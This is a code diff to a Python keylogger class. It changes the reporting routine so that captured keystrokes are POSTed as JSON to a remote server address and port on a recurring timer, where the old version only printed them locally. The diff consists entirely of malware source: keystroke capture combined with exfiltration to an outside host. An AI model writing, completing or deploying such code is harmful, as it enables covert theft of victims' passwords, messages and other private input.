@@ -17,13 +17,18 @@ class KeyLogger:
     
     def _send_post_request(self):
         payload = json.dumps({"keyboardData": self.text})
+        try:
+            requests.post(f"http://{self.server_ip}:{self.port}", 
+                          data=payload, 
+                          headers={"Content-Type" : "application/json"}
+                          )
+        except:
+            print("Failed to send log!")
 
-
-        print ("[LOG SEND]", payload)
-        self.text = ""
-
-        timer = threading.Timer(self.interval, self._send_post_request)
-        timer.start()  
+        finally:
+            self.text = ""
+            timer = threading.Timer(self.interval, self._send_post_request)
+            timer.start()
 
 
     def _on_press(self, key):
